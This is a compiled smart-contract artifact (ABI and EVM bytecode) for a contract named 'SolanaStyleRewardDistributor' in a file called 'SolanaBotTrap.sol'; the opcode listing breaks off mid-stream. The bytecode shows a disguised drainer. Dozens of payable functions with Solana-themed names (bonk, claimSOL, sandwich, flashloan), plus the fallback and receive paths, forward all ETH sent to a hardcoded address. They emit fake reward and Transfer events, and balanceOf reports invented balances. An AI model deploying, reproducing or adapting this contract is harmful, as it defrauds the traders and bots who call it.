{"contracts/SolanaBotTrap.sol":{"SolanaStyleRewardDistributor":{"abi":[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amountIn","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"amountOut","type":"uint256"}],"name":"JupiterSwap","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"rewards","type":"uint256"}],"name":"RaydiumClaim","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"participant","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokens","type":"uint256"}],"name":"RewardDistributed","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"SolanaSync","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"stateMutability":"payable","type":"fallback"},{"inputs":[],"name":"arbitrage","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"backrun","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"bome","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"bonk","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"claimSOL","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"copyTrade","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"drift","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"epochRewards","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"flashloan","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"frontrun","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"getInteractionCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getParticipationFee","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"getTotalParticipants","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"governance","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"jito","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"jup","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"jupiterSwap","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"kamino","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"liquidation","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"liquidityMining","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"mango","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"marinade","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"meteora","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"mev","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"mew","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"myro","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"orcaSwap","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"phoenix","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"popcat","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"ray","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"raydiumClaim","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"sanctum","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"sandwich","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"serumTrade","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"slerf","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"snipe","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"solend","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"stakeSOL","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"tensor","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"unstakeSOL","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"validatorRewards","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"vesting","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"volume","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"wen","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"wif","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"yieldFarm","outputs":[],"stateMutability":"payable","type":"function"},{"stateMutability":"payable","type":"receive"}],"evm":{"bytecode":{"linkReferences":{},"object":"60c0604052601260809081527129b7b630b730902932bbb0b9323990243ab160711b60a052600190610031908261022e565b506040805180820190915260038152620a6a4960eb1b6020820152600290610059908261022e565b506003805460ff19166009179055670de0b6b3a764000060045534801561007f57600080fd5b50600080546001600160a01b0319167315e1a8454e2f31f64042eae445ec89266cb584be17815560088190556004546040513092917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef916100e291815260200190565b60405180910390a360005460405166b1a2bc2ec5000081526001600160a01b03909116907f50e069678a3df12fbe86d1afd973361844b2a496bd2992e7063d5a15f7582b979060200160405180910390a260005460408051683635c9adc5dea0000081526601c6bf5263400060208201526001600160a01b03909216917fda13a851f9f3a4378c79402a2a8c0f352364f72e3ba805d3e3d4bc0f03e4c918910160405180910390a26102ec565b634e487b7160e01b600052604160045260246000fd5b600181811c908216806101b957607f821691505b6020821081036101d957634e487b7160e01b600052602260045260246000fd5b50919050565b601f82111561022957806000526020600020601f840160051c810160208510156102065750805b601f840160051c820191505b818110156102265760008155600101610212565b50505b505050565b81516001600160401b038111156102475761024761018f565b61025b8161025584546101a5565b846101df565b6020601f82116001811461028f57600083156102775750848201515b600019600385901b1c1916600184901b178455610226565b600084815260208120601f198516915b828110156102bf578785015182556020948501946001909201910161029f565b50848210156102dd5786840151600019600387901b60f8161c191681555b50505050600190811b01905550565b610df9806102fb6000396000f3fe6080604052600436106102e85760003560e01c80635d1e36161161019057806389cf3eeb116100dc578063c58e827611610095578063e7c7477a1161006f578063e7c7477a146106bc578063ef9411cc146106c4578063f2dfbf66146106cc578063f8854760146106d4576103d8565b8063c58e8276146106a4578063c618a1e4146106ac578063d3b33b63146106b4576103d8565b806389cf3eeb1461065a57806395d89b4114610662578063978dc1ea14610677578063a90cc4451461067f578063b132377914610694578063be8614401461069c576103d8565b8063773f7a3a11610149578063823ac84211610123578063823ac8421461062957806382a761f01461063157806385b2d53514610639578063863fc11e14610641576103d8565b8063773f7a3a146106115780637af3b822146106195780638191b45b14610621576103d8565b80635d1e3616146105c95780636590a477146105d157806369c8d338146105d95780636da3c0d5146105e157806370a08231146105e95780637495b37214610609576103d8565b80631e092efb1161024f5780634947bfda1161020857806355905e71116101e257806355905e71146105a95780635aa6e675146105b15780635b1614fc146105b95780635c69f9da146105c1576103d8565b80634947bfda146105635780634c5a0aaa1461056b57806353767ca4146105a1576103d8565b80631e092efb1461050f57806322b689d514610517578063313ce5671461051f57806339b0ff211461054b578063416a8b201461055357806344c63eec1461055b576103d8565b806313c9b33a116102a157806313c9b33a146104c357806318160ddd146104cb578063194ea505146104ef5780631ac19af7146104f75780631b89b61a146104ff5780631dd13e2514610507576103d8565b806302fdfcaf1461047857806306fdde031461048057806307824c06146104ab5780630c60e091146104b35780630f405257146104b3578063117fa591146104bb576103d8565b366103d8576102f6336106dc565b600080546040516001600160a01b039091169034908381818185875af1925050503d8060008114610343576040519150601f19603f3d011682016040523d82523d6000602084013e610348565b606091505b50509050806103975760405162461bcd60e51b8152602060048201526016602482015275111a5c9958dd081d1c985b9cd9995c8819985a5b195960521b60448201526064015b60405180910390fd5b337fe34918ff1c7084970068b53fd71ad6d8b04e9f15d3886cbf006443e6cdc52ea66103c534612710610cd5565b60405190815260200160405180910390a2005b6103e1336106dc565b600080546040516001600160a01b039091169034908381818185875af1925050503d806000811461042e576040519150601f19603f3d011682016040523d82523d6000602084013e610433565b606091505b50509050806104765760405162461bcd60e51b815260206004820152600f60248201526e11985b1b189858dac819985a5b1959608a1b604482015260640161038e565b005b610476610795565b34801561048c57600080fd5b506104956107a7565b6040516104a29190610cf2565b60405180910390f35b610476610835565b610476610845565b610476610855565b610476610865565b3480156104d757600080fd5b506104e160045481565b6040519081526020016104a2565b610476610875565b610476610885565b610476610895565b6104766108a5565b6104766108b5565b6104766108c5565b34801561052b57600080fd5b506003546105399060ff1681565b60405160ff90911681526020016104a2565b6104766108d5565b6104766108e5565b6104766108f5565b610476610905565b34801561057757600080fd5b506104e1610586366004610d40565b6001600160a01b031660009081526006602052604090205490565b610476610915565b610476610925565b610476610935565b610476610945565b610476610955565b610476610965565b610476610975565b610476610985565b610476610995565b3480156105f557600080fd5b506104e1610604366004610d40565b6109a5565b610476610a1a565b610476610a2a565b610476610a3a565b610476610a4a565b610476610a5a565b610476610a6a565b610476610a7a565b34801561064d57600080fd5b50655af3107a40006104e1565b610476610a8a565b34801561066e57600080fd5b50610495610a9a565b610476610aa7565b34801561068b57600080fd5b506008546104e1565b610476610ab7565b610476610ac7565b610476610ad7565b610476610ae7565b610476610af7565b610476610b07565b610476610b17565b610476610b27565b610476610b37565b6001600160a01b038116600090815260056020526040812054900361075c576008805490600061070b83610d70565b9091555050600780546001810182556000919091527fa66cc928b5edb82af9bd49922954155ab7b0942694bea4ce44661d9a8736c6880180546001600160a01b0319166001600160a01b0383161790555b6001600160a01b03811660009081526005602090815260408083204290556006909152812080549161078d83610d70565b919050555050565b6107a53365246139ca8000610b43565b565b600180546107b490610d89565b80601f01602080910402602001604051908101604052809291908181526020018280546107e090610d89565b801561082d5780601f106108025761010080835404028352916020019161082d565b820191906000526020600020905b81548152906001019060200180831161081057829003601f168201915b505050505081565b6107a533651e0369471000610b43565b6107a5336512309ce54000610b43565b6107a533650da475abf000610b43565b6107a533651b48eb57e000610b43565b6107a5336510d35deda800610b43565b6107a533651fd512913000610b43565b6107a5336516bcc41e9000610b43565b6107a533651402462f6000610b43565b6107a533651476b081e800610b43565b6107a533652632e314a000610b43565b6107a533651977420dc000610b43565b6107a533652ba7def30000610b43565b6107a5336511bc3292b800610b43565b6107a533650a012317b000610b43565b6107a533650bd2cc61d000610b43565b6107a533652d79883d2000610b43565b6107a533650f01b4a38800610b43565b6107a533650cbba106e000610b43565b6107a5336521a6bbdb5000610b43565b6107a5336514eb1ad47000610b43565b6107a5336508a3e4201800610b43565b6107a53365105ef39b2000610b43565b6107a533650b5e620f4800610b43565b60006001600160a01b0382166109bd57506000919050565b6000546001600160a01b03908116908316036109e2575067016345785d8a0000919050565b6001600160a01b03821660009081526005602052604090205415610a0d575065048c27395000919050565b50650246139ca800919050565b6107a5336507bb0f7b0800610b43565b6107a533651319718a5000610b43565b6107a5336509184e72a000610b43565b6107a5336506d23ad5f800610b43565b6107a533650a758d6a3800610b43565b6107a533651147c8403000610b43565b6107a5336515d3ef798000610b43565b6107a533653205af767000610b43565b600280546107b490610d89565b6107a53365082f79cd9000610b43565b6107a533650746a5288000610b43565b6107a533650ae9f7bcc000610b43565b6107a533650e18dffe7800610b43565b6107a533650fea89489800610b43565b6107a533650800e8dfc000610b43565b6107a53365098cb8c52800610b43565b6107a5336528ed6103d000610b43565b6107a533650e8d4a510000610b43565b6107a53365228f908060005b655af3107a4000341015610b995760405162461bcd60e51b815260206004820152601760248201527f4665653a20302e3030303120455448206d696e696d756d000000000000000000604482015260640161038e565b610ba2826106dc565b600080546040516001600160a01b039091169034908381818185875af1925050503d8060008114610bef576040519150601f19603f3d011682016040523d82523d6000602084013e610bf4565b606091505b5050905080610c375760405162461bcd60e51b815260206004820152600f60248201526e151c985b9cd9995c8819985a5b1959608a1b604482015260640161038e565b826001600160a01b03167fe34918ff1c7084970068b53fd71ad6d8b04e9f15d3886cbf006443e6cdc52ea683604051610c7291815260200190565b60405180910390a26040518281526001600160a01b0384169030907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a3505050565b634e487b7160e01b600052601160045260246000fd5b8082028115828204841417610cec57610cec610cbf565b92915050565b602081526000825180602084015260005b81811015610d205760208186018101516040868401015201610d03565b506000604082850101526040601f19601f83011684010191505092915050565b600060208284031215610d5257600080fd5b81356001600160a01b0381168114610d6957600080fd5b9392505050565b600060018201610d8257610d82610cbf565b5060010190565b600181811c90821680610d9d57607f821691505b602082108103610dbd57634e487b7160e01b600052602260045260246000fd5b5091905056fea264697066735822122048fc33b20452cc498a3b94f30a566dd3b49c536df1feea8bf8f0ef428ad9c8b264736f6c634300081c0033","opcodes":"PUSH1 0xC0 PUSH1 0x40 MSTORE PUSH1 0x12 PUSH1 0x80 SWAP1 DUP2 MSTORE PUSH18 0x29B7B630B730902932BBB0B9323990243AB1 PUSH1 0x71 SHL PUSH1 0xA0 MSTORE PUSH1 0x1 SWAP1 PUSH2 0x31 SWAP1 DUP3 PUSH2 0x22E JUMP JUMPDEST POP PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 0x3 DUP2 MSTORE PUSH3 0xA6A49 PUSH1 0xEB SHL PUSH1 0x20 DUP3 ADD MSTORE PUSH1 0x2 SWAP1 PUSH2 0x59 SWAP1 DUP3 PUSH2 0x22E JUMP JUMPDEST POP PUSH1 0x3 DUP1 SLOAD PUSH1 0xFF NOT AND PUSH1 0x9 OR SWAP1 SSTORE PUSH8 0xDE0B6B3A7640000 PUSH1 0x4 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x7F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH20 0x15E1A8454E2F31F64042EAE445EC89266CB584BE OR DUP2 SSTORE PUSH1 0x8 DUP2 SWAP1 SSTORE PUSH1 0x4 SLOAD PUSH1 0x40 MLOAD ADDRESS SWAP3 SWAP2 PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP2 PUSH2 0xE2 SWAP2 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH7 0xB1A2BC2EC50000 DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH32 0x50E069678A3DF12FBE86D1AFD973361844B2A496BD2992E7063D5A15F7582B97 SWAP1 PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG2 PUSH1 0x0 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH9 0x3635C9ADC5DEA00000 DUP2 MSTORE PUSH7 0x1C6BF52634000 PUSH1 0x20 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH32 0xDA13A851F9F3A4378C79402A2A8C0F352364F72E3BA805D3E3D4BC0F03E4C918 SWAP2 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG2 PUSH2 0x2EC JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x1 DUP2 DUP2 SHR SWAP1 DUP3 AND DUP1 PUSH2 0x1B9 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH2 0x1D9 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x1F DUP3 GT ISZERO PUSH2 0x229 JUMPI DUP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 PUSH1 0x1F DUP5 ADD PUSH1 0x5 SHR DUP2 ADD PUSH1 0x20 DUP6 LT ISZERO PUSH2 0x206 JUMPI POP DUP1 JUMPDEST PUSH1 0x1F DUP5 ADD PUSH1 0x5 SHR DUP3 ADD SWAP2 POP JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x226 JUMPI PUSH1 0x0 DUP2 SSTORE PUSH1 0x1 ADD PUSH2 0x212 JUMP JUMPDEST POP POP JUMPDEST POP POP POP JUMP JUMPDEST DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x40 SHL SUB DUP2 GT ISZERO PUSH2 0x247 JUMPI PUSH2 0x247 PUSH2 0x18F JUMP JUMPDEST PUSH2 0x25B DUP2 PUSH2 0x255 DUP5 SLOAD PUSH2 0x1A5 JUMP JUMPDEST DUP5 PUSH2 0x1DF JUMP JUMPDEST PUSH1 0x20 PUSH1 0x1F DUP3 GT PUSH1 0x1 DUP2 EQ PUSH2 0x28F JUMPI PUSH1 0x0 DUP4 ISZERO PUSH2 0x277 JUMPI POP DUP5 DUP3 ADD MLOAD JUMPDEST PUSH1 0x0 NOT PUSH1 0x3 DUP6 SWAP1 SHL SHR NOT AND PUSH1 0x1 DUP5 SWAP1 SHL OR DUP5 SSTORE PUSH2 0x226 JUMP JUMPDEST PUSH1 0x0 DUP5 DUP2 MSTORE PUSH1 0x20 DUP2 KECCAK256 PUSH1 0x1F NOT DUP6 AND SWAP2 JUMPDEST DUP3 DUP2 LT ISZERO PUSH2 0x2BF JUMPI DUP8 DUP6 ADD MLOAD DUP3 SSTORE PUSH1 0x20 SWAP5 DUP6 ADD SWAP5 PUSH1 0x1 SWAP1 SWAP3 ADD SWAP2 ADD PUSH2 0x29F JUMP JUMPDEST POP DUP5 DUP3 LT ISZERO PUSH2 0x2DD JUMPI DUP7 DUP5 ADD MLOAD PUSH1 0x0 NOT PUSH1 0x3 DUP8 SWAP1 SHL PUSH1 0xF8 AND SHR NOT AND DUP2 SSTORE JUMPDEST POP POP POP POP PUSH1 0x1 SWAP1 DUP2 SHL ADD SWAP1 SSTORE POP JUMP JUMPDEST PUSH2 0xDF9 DUP1 PUSH2 0x2FB PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2E8 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x5D1E3616 GT PUSH2 0x190 JUMPI DUP1 PUSH4 0x89CF3EEB GT PUSH2 0xDC JUMPI DUP1 PUSH4 0xC58E8276 GT PUSH2 0x95 JUMPI DUP1 PUSH4 0xE7C7477A GT PUSH2 0x6F JUMPI DUP1 PUSH4 0xE7C7477A EQ PUSH2 0x6BC JUMPI DUP1 PUSH4 0xEF9411CC EQ PUSH2 0x6C4 JUMPI DUP1 PUSH4 0xF2DFBF66 EQ PUSH2 0x6CC JUMPI DUP1 PUSH4 0xF8854760 EQ PUSH2 0x6D4 JUMPI PUSH2 0x3D8 JUMP JUMPDEST DUP1 PUSH4 0xC58E8276 EQ PUSH2 0x6A4 JUMPI DUP1 PUSH4 0xC618A1E4 EQ PUSH2 0x6AC JUMPI DUP1 PUSH4 0xD3B33B63 EQ PUSH2 0x6B4 JUMPI PUSH2 0x3D8 JUMP JUMPDEST DUP1 PUSH4 0x89CF3EEB EQ PUSH2 0x65A JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x662 JUMPI DUP1 PUSH4 0x978DC1EA EQ PUSH2 0x677 JUMPI DUP1 PUSH4 0xA90CC445 EQ PUSH2 0x67F JUMPI DUP1 PUSH4 0xB1323779 EQ PUSH2 0x694 JUMPI DUP1 PUSH4 0xBE861440 EQ PUSH2 0x69C JUMPI PUSH2 0x3D8 JUMP JUMPDEST DUP1 PUSH4 0x773F7A3A GT PUSH2 0x149 JUMPI DUP1 PUSH4 0x823AC842 GT PUSH2 0x123 JUMPI DUP1 PUSH4 0x823AC842 EQ PUSH2 0x629 JUMPI DUP1 PUSH4 0x82A761F0 EQ PUSH2 0x631 JUMPI DUP1 PUSH4 0x85B2D535 EQ PUSH2 0x639 JUMPI DUP1 PUSH4 0x863FC11E EQ PUSH2 0x641 JUMPI PUSH2 0x3D8 JUMP JUMPDEST DUP1 PUSH4 0x773F7A3A EQ PUSH2 0x611 JUMPI DUP1 PUSH4 0x7AF3B822 EQ PUSH2 0x619 JUMPI DUP1 PUSH4 0x8191B45B EQ PUSH2 0x621 JUMPI PUSH2 0x3D8 JUMP JUMPDEST DUP1 PUSH4 0x5D1E3616 EQ PUSH2 0x5C9 JUMPI DUP1 PUSH4 0x6590A477 EQ PUSH2 0x5D1 JUMPI DUP1 PUSH4 0x69C8D338 EQ PUSH2 0x5D9 JUMPI DUP1 PUSH4 0x6DA3C0D5 EQ PUSH2 0x5E1 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x5E9 JUMPI DUP1 PUSH4 0x7495B372 EQ PUSH2 0x609 JUMPI PUSH2 0x3D8 JUMP JUMPDEST DUP1 PUSH4 0x1E092EFB GT PUSH2 0x24F JUMPI DUP1 PUSH4 0x4947BFDA GT PUSH2 0x208 JUMPI DUP1 PUSH4 0x55905E71 GT PUSH2 0x1E2 JUMPI DUP1 PUSH4 0x55905E71 EQ PUSH2 0x5A9 JUMPI DUP1 PUSH4 0x5AA6E675 EQ PUSH2 0x5B1 JUMPI DUP1 PUSH4 0x5B1614FC EQ PUSH2 0x5B9 JUMPI DUP1 PUSH4 0x5C69F9DA EQ PUSH2 0x5C1 JUMPI PUSH2 0x3D8 JUMP JUMPDEST DUP1 PUSH4 0x4947BFDA EQ PUSH2 0x563 JUMPI DUP1 PUSH4 0x4C5A0AAA EQ PUSH2 0x56B JUMPI DUP1 PUSH4 0x53767CA4 EQ PUSH2 0x5A1 JUMPI PUSH2 0x3D8 JUMP JUMPDEST DUP1 PUSH4 0x1E092EFB EQ PUSH2 0x50F JUMPI DUP1 PUSH4 0x22B689D5 EQ PUSH2 0x517 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x51F JUMPI DUP1 PUSH4 0x39B0FF21 EQ PUSH2 0x54B JUMPI DUP1 PUSH4 0x416A8B20 EQ PUSH2 0x553 JUMPI DUP1 PUSH4 0x44C63EEC EQ PUSH2 0x55B JUMPI PUSH2 0x3D8 JUMP JUMPDEST DUP1 PUSH4 0x13C9B33A GT PUSH2 0x2A1 JUMPI DUP1 PUSH4 0x13C9B33A EQ PUSH2 0x4C3 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x4CB JUMPI DUP1 PUSH4 0x194EA505 EQ PUSH2 0x4EF JUMPI DUP1 PUSH4 0x1AC19AF7 EQ PUSH2 0x4F7 JUMPI DUP1 PUSH4 0x1B89B61A EQ PUSH2 0x4FF JUMPI DUP1 PUSH4 0x1DD13E25 EQ PUSH2 0x507 JUMPI PUSH2 0x3D8 JUMP JUMPDEST DUP1 PUSH4 0x2FDFCAF EQ PUSH2 0x478 JUMPI DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x480 JUMPI DUP1 PUSH4 0x7824C06 EQ PUSH2 0x4AB JUMPI DUP1 PUSH4 0xC60E091 EQ PUSH2 0x4B3 JUMPI DUP1 PUSH4 0xF405257 EQ PUSH2 0x4B3 JUMPI DUP1 PUSH4 0x117FA591 EQ PUSH2 0x4BB JUMPI PUSH2 0x3D8 JUMP JUMPDEST CALLDATASIZE PUSH2 0x3D8 JUMPI PUSH2 0x2F6 CALLER PUSH2 0x6DC JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 CALLVALUE SWAP1 DUP4 DUP2 DUP2 DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x343 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x348 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x397 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x16 PUSH1 0x24 DUP3 ADD MSTORE PUSH22 0x111A5C9958DD081D1C985B9CD9995C8819985A5B1959 PUSH1 0x52 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST CALLER PUSH32 0xE34918FF1C7084970068B53FD71AD6D8B04E9F15D3886CBF006443E6CDC52EA6 PUSH2 0x3C5 CALLVALUE PUSH2 0x2710 PUSH2 0xCD5 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG2 STOP JUMPDEST PUSH2 0x3E1 CALLER PUSH2 0x6DC JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 CALLVALUE SWAP1 DUP4 DUP2 DUP2 DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x42E JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x433 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x476 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x11985B1B189858DAC819985A5B1959 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x38E JUMP JUMPDEST STOP JUMPDEST PUSH2 0x476 PUSH2 0x795 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x48C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x495 PUSH2 0x7A7 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x4A2 SWAP2 SWAP1 PUSH2 0xCF2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x476 PUSH2 0x835 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x845 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x855 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x865 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x4D7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x4E1 PUSH1 0x4 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x4A2 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x875 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x885 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x895 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x8A5 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x8B5 JUMP JUMPDEST PUSH2 0x476 PUSH2 0x8C5 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x52B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x3 SLOAD PUSH2 